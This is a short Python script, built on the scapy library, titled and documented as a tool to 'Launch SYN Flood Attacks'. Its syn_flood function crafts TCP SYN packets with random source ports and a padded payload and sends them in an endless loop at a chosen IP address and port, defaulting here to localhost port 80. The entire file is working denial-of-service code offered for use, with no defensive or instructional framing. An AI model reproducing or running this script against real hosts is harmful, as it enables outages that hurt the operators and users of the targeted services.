"""Launch SYN Flood Attacks
"""
    
from scapy.all import (
    IP, 
    TCP, 
    RandShort,
    Raw,
    send
)

def syn_flood(target_ip: str, target_port: int, data_size:int = 1024, verbose: bool = False) -> None:
    """Launch a basic SYN Flood Attack

    Args:
        target_ip (str): IP Address (ex: "127.0.0.1").
        target_port (int): Port Number (ex: 80).
        data_size (int, optional): Size of SYN raw bytestring. Defaults to 1024.
        verbose (bool, optional): Print outputs. Defaults to False.
    """
    
    ip = IP(dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    raw = Raw(b"X" * data_size)
    
    p = ip / tcp / raw

    send(p, loop=1, verbose=verbose)

if __name__ == '__main__':
    syn_flood(target_ip="127.0.0.1", target_port=80, data_size=1024, verbose=True)
